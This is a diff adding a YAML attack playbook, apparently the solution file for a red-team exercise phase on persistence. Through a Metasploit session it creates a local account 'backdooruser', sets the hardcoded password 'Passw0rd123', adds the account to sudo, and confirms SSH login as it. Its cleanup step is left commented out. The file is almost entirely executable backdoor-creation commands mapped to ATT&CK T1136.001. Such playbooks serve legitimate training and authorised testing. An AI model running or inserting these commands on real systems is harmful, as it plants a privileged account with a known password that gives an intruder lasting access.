@@ -1,0 +1,57 @@
+# Phase 5 SOLUTION: Persistence - Create Backdoor User
+#
+# Creates a new local account with a known password and sudo rights.
+# After this, the attacker can SSH in as the backdoor user at any time
+# regardless of what happens to the original compromise vector.
+#
+# Variables required: $SESSION_NAME, $TARGET
+# ATT&CK: T1136.001 (Create Account: Local Account)
+#
+# NOTE: Requires root. New accounts appear in /etc/passwd and will be
+# visible during any user audit.
+#
+# CLEANUP: Run 'userdel -r backdooruser' at the end of the exercise.
+
+commands:
+  # Step 1: Create the user with a home directory and a login shell.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: useradd -m -s /bin/bash backdooruser
+    metadata:
+      tactic: "TA0003"
+      technique: "T1136.001"
+      technique_name: "Create Account: Local Account"
+
+  # Step 2: Set the password using chpasswd (reads "user:password" from stdin).
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: echo "backdooruser:Passw0rd123" | chpasswd
+
+  # Step 3: Add the user to the sudo group to grant administrative rights.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: usermod -aG sudo backdooruser
+
+  # Verify the account was created
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: grep backdooruser /etc/passwd
+
+  - type: debug
+    cmd: "Account created: $RESULT_STDOUT"
+
+  # Step 4: Verify SSH access with the new account.
+  - type: ssh
+    cmd: id
+    hostname: $TARGET
+    username: backdooruser
+    password: Passw0rd123
+    creates_session: backdoor_user_session
+
+  - type: debug
+    cmd: "Backdoor account SSH access confirmed: $RESULT_STDOUT"
+
+  # CLEANUP: uncomment to remove the backdoor account
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: userdel -r backdooruser
